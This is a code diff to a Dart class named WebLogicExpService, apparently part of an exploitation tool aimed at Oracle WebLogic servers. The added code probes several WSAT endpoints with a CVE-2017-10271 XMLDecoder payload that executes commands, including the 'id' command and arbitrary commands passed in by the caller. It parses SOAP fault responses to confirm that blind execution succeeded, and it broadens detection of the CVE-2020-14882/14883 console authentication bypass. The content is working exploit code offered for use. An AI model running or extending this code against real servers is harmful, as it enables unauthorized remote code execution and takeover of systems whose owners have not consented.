@@ -1,6 +1,7 @@
 import 'dart:io';
 
 import '../../../core/http/http_client.dart';
+import '../../../core/http/http_result.dart';
 
 import 'exp_result.dart';
 import 'rce_encoder.dart';
@@ -269,21 +270,98 @@ class WebLogicExpService {
 </soapenv:Envelope>''';
   }
 
+  static const List<String> _xmlDecoderProbePaths = <String>[
+    '/wls-wsat/CoordinatorPortType',
+    '/wls-wsat/CoordinatorPortType11',
+    '/wls-wsat/RegistrationPortTypeRPC',
+    '/wls-wsat/ParticipantPortType',
+    '/wls-wsat/CoordinatorPortType/',
+  ];
+
+  bool _looksLikeXmlDecoderEndpointResponse(HttpResult res) {
+    final code = res.statusCode ?? 0;
+    final body = (res.body ?? '').toLowerCase();
+    final isPotentialCode = code == 200 || code == 202 || code == 500;
+    final hasSoapOrFaultSignal = body.contains('soap') ||
+        body.contains('fault') ||
+        body.contains('weblogic.wsee') ||
+        body.contains('workcontext') ||
+        body.contains('xmldecoder');
+    return isPotentialCode || hasSoapOrFaultSignal;
+  }
+
+  String? _pickXmlTag(String xml, String tag) {
+    final reg = RegExp('<$tag[^>]*>([\\s\\S]*?)</$tag>', caseSensitive: false);
+    final m = reg.firstMatch(xml);
+    if (m == null) return null;
+    final v = m.group(1)?.trim();
+    return (v == null || v.isEmpty) ? null : v;
+  }
+
+  String? _pickXmlAttr(String xml, String tag, String attr) {
+    final reg = RegExp(
+      '<$tag[^>]*\\s$attr="([^"]+)"[^>]*>',
+      caseSensitive: false,
+    );
+    final m = reg.firstMatch(xml);
+    final v = m?.group(1)?.trim();
+    return (v == null || v.isEmpty) ? null : v;
+  }
+
+  String _formatXmlDecoderExecResponse(HttpResult res) {
+    final code = res.statusCode ?? 0;
+    final body = (res.body ?? '').trim();
+    if (body.isEmpty) {
+      return '命令已发送 (HTTP $code)，无响应体';
+    }
+
+    final lower = body.toLowerCase();
+    final isSoap = lower.contains('<s:envelope') ||
+        lower.contains('<soapenv:envelope') ||
+        lower.contains('<fault');
+    if (!isSoap) return body;
+
+    final faultCode = _pickXmlTag(body, 'faultcode');
+    final faultString = _pickXmlTag(body, 'faultstring');
+    final exClass = _pickXmlAttr(body, 'ns2:exception', 'class') ??
+        _pickXmlAttr(body, 'exception', 'class');
+    final exMsg = _pickXmlTag(body, 'message');
+
+    final lines = <String>[
+      'SOAP 响应 (HTTP $code)',
+      if (faultCode != null) 'faultcode: $faultCode',
+      if (faultString != null) 'faultstring: $faultString',
+      if (exClass != null) 'exception: $exClass',
+      if (exMsg != null) 'message: $exMsg',
+      if (faultString == '0' || exClass?.contains('ArrayIndexOutOfBoundsException') == true)
+        '提示: 该特征通常表示 XMLDecoder 链路已被触发（常见于无回显执行）',
+    ];
+    return lines.join('\n');
+  }
+
   Future<ExpResult> checkCve201710271() async {
-    try {
-      final res = await _httpClient.post(
-        '$_base/wls-wsat/CoordinatorPortType',
-        headers: {'Content-Type': 'text/xml'},
-        body: _xmlDecoderPayload('id'),
-      );
-      if (res.statusCode == 200 || res.statusCode == 500) {
-        return ExpResult(
-          true,
-          'CVE-2017-10271',
-          'WebLogic XMLDecoder 端点存在 (${res.statusCode})',
+    for (final path in _xmlDecoderProbePaths) {
+      try {
+        final res = await _httpClient.post(
+          '$_base$path',
+          headers: const {
+            'Content-Type': 'text/xml; charset=UTF-8',
+            'SOAPAction': '""',
+          },
+          body: _xmlDecoderPayload('id'),
         );
+        if (_looksLikeXmlDecoderEndpointResponse(res)) {
+          final code = res.statusCode ?? 0;
+          return ExpResult(
+            true,
+            'CVE-2017-10271',
+            'WebLogic XMLDecoder 端点存在 ($path, HTTP $code)',
+          );
+        }
+      } catch (_) {
+        // Continue probing other known WSAT endpoints.
       }
-    } catch (_) {}
+    }
     return const ExpResult(false, 'CVE-2017-10271', '');
   }
 
@@ -294,10 +372,7 @@ class WebLogicExpService {
         headers: {'Content-Type': 'text/xml'},
         body: _xmlDecoderPayload(cmd),
       );
-      final body = res.body ?? '';
-      return body.isNotEmpty
-          ? body
-          : '命令已发送 (状态 ${res.statusCode})，无直接回显';
+      return _formatXmlDecoderExecResponse(res);
     } catch (_) {
       return null;
     }
@@ -315,13 +390,26 @@ class WebLogicExpService {
       final req = await client.getUrl(uri).timeout(timeout);
       req.followRedirects = false;
       final res = await req.close().timeout(timeout);
-      final location = res.headers.value('location') ?? '';
-      if ((res.statusCode == 302 || res.statusCode == 200) &&
-          location.contains('console.portal')) {
+      final location = (res.headers.value('location') ?? '').toLowerCase();
+      final body = await res.transform(SystemEncoding().decoder).join();
+      final bodyLower = body.toLowerCase();
+
+      final isRedirect = res.statusCode >= 300 && res.statusCode < 400;
+      final hasBypassLocation = location.contains('console.portal') ||
+          location.contains('%2e%2e%2fconsole.portal') ||
+          location.contains('_pagelabel=');
+      final hasBypassBody = bodyLower.contains('console.portal') ||
+          bodyLower.contains('_pagelabel=') ||
+          bodyLower.contains('weblogic server console');
+
+      if ((isRedirect && hasBypassLocation) ||
+          (res.statusCode == 200 && hasBypassBody)) {
         return ExpResult(
           true,
           'CVE-2020-14882/14883',
-          '控制台路径绕过成功，Location: $location',
+          isRedirect
+              ? '控制台路径绕过成功，HTTP ${res.statusCode}, Location: $location'
+              : '控制台路径绕过成功，HTTP 200 命中控制台特征',
         );
       }
     } catch (_) {
